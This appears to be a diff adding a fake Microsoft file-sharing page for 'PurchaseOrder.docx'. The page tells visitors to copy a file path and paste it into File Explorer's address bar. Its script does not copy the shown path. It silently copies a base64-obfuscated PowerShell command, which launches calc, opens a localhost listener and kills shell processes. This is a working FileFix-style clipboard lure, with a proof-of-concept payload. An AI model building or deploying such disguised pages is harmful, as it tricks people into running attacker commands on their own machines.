@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shared file - PurchaseOrder.docx</title>
+<style>
+  :root{
+    --bg:#f3f4f6;
+    --card:#ffffff;
+    --text:#111827;
+    --muted:#4b5563;
+    --border:#e5e7eb;
+    --codebg:#f9fafb;
+    --button:#0078d4;
+    --button-hover:#106ebe;
+  }
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:"Segoe UI",system-ui,-apple-system,Roboto,"Helvetica Neue",Arial,"Noto Sans","Liberation Sans",sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    display:grid;
+    place-items:center;
+  }
+  .wrap{
+    width:720px;
+    max-width:calc(100vw - 32px);
+    background:var(--card);
+    border-radius:10px;
+    box-shadow:0 10px 30px rgba(0,0,0,.08),0 2px 8px rgba(0,0,0,.06);
+    overflow:hidden;
+    border:1px solid var(--border);
+  }
+  .content{padding:48px 56px 28px 56px}
+  .icon{
+    width:64px;height:64px;margin:0 auto 20px auto;border-radius:12px;
+    display:grid;place-items:center;
+    background:#f5f9ff;border:1px solid #e6eefb;
+  }
+  .icon svg{width:34px;height:34px;fill:#111827}
+  h1{font-weight:700;font-size:24px;text-align:center;margin:0 0 22px 0;letter-spacing:.2px}
+  h1 .file{font-weight:800}
+  .lead{font-size:15px;color:var(--muted);margin:0 0 14px 0;text-align:left}
+  ol{margin:0;padding-left:18px;color:var(--text);font-size:15px;line-height:1.65}
+  ol li{margin:10px 0}
+  .kbd{font-weight:700}
+  .path-box{
+    margin:10px 0 8px 0;background:var(--codebg);
+    border:1px solid var(--border);border-radius:6px;
+    padding:10px 12px;font-family:Consolas,"Cascadia Mono","SFMono-Regular",Menlo,Monaco,monospace;
+    font-size:13px;color:#1f2937;cursor:pointer;user-select:all;
+    transition:background .2s ease,border .2s ease;
+  }
+  .path-box:hover{background:#eef2ff;border-color:#c7d2fe}
+  .cta{
+    display:block;margin:26px auto 8px auto;width:240px;text-align:center;
+    background:var(--button);color:#fff;border-radius:6px;padding:12px 16px;
+    text-decoration:none;font-weight:600;border:1px solid #0b63a5;
+    transition:background .15s ease,transform .02s ease;
+  }
+  .cta:hover{background:var(--button-hover)}
+  .cta:active{transform:translateY(1px)}
+  .foot{border-top:1px solid var(--border);padding:12px 16px;display:flex;align-items:center;gap:10px}
+  .mslogo{
+    width:18px;height:18px;display:grid;
+    grid-template-columns:repeat(2,1fr);grid-template-rows:repeat(2,1fr);
+    gap:2px;
+  }
+  .mslogo span{display:block;width:100%;height:100%}
+  .mslogo .r{background:#f25022}.mslogo .g{background:#7fba00}
+  .mslogo .b{background:#00a4ef}.mslogo .y{background:#ffb900}
+</style>
+</head>
+<body>
+  <main class="wrap">
+    <section class="content">
+      <div class="icon">
+        <svg viewBox="0 0 24 24"><path d="M14 3l7 7-7 7v-4H9a5 5 0 01-5-5V6h2v2a3 3 0 003 3h5V3zM4 19h16v2H4z"/></svg>
+      </div>
+
+      <h1>Ryan shared "<span class="file">PurchaseOrder.docx</span>" with you</h1>
+
+      <p class="lead">To access <strong>PurchaseOrder.docx</strong>, follow these steps:</p>
+
+      <ol>
+        <li>Copy the file path below</li>
+        <span class="path-box" id="filepath">\\share\vendor\requests\pending\approval\PurchaseOrder.docx</span>
+        <li>Open File Explorer and select the address bar <span class="kbd">(CTRL + L)</span></li>
+        <li>Paste the file path and press <strong>Enter</strong></li>
+      </ol>
+
+      <label for="fileupload" class="cta" role="button">Open File Explorer</label>
+      <input type="file" id="fileupload" style="display:none">
+    </section>
+
+    <footer class="foot">
+      <div class="mslogo"><span class="r"></span><span class="g"></span><span class="b"></span><span class="y"></span></div>
+    </footer>
+  </main>
+
+<script>
+const pathBox = document.getElementById("filepath");
+pathBox.addEventListener("click", async () => {
+  try {
+    await navigator.clipboard.writeText(atob("cG93ZXJzaGVsbCAtY29tbWFuZCAiY2FsYzsgJGw9W05ldC5IdHRwTGlzdGVuZXJdOjpuZXcoKTskbC5QcmVmaXhlcy5BZGQoJ2h0dHA6Ly9sb2NhbGhvc3Q6ODA4MC8nKTskbC5TdGFydCgpOyRjPSRsLkdldENvbnRleHQoKTskcj0kYy5SZXNwb25zZTskci5TdGF0dXNDb2RlPTIwMDskci5PdXRwdXRTdHJlYW0uQ2xvc2UoKTskbC5TdG9wKCk7U3RvcC1Qcm9jZXNzIC1OYW1lIGNtZCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZTtTdG9wLVByb2Nlc3MgLU5hbWUgcG93ZXJzaGVsbCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSIKCgo="));
+
+    //await navigator.clipboard.writeText(pathBox.textContent);
+    const original = pathBox.textContent;
+    pathBox.textContent = "Copied!";
+    setTimeout(()=>pathBox.textContent = original, 1500);
+  } catch {
+    alert("Clipboard copy failed.");
+  }
+});
+</script>
+</body>
+</html>
+
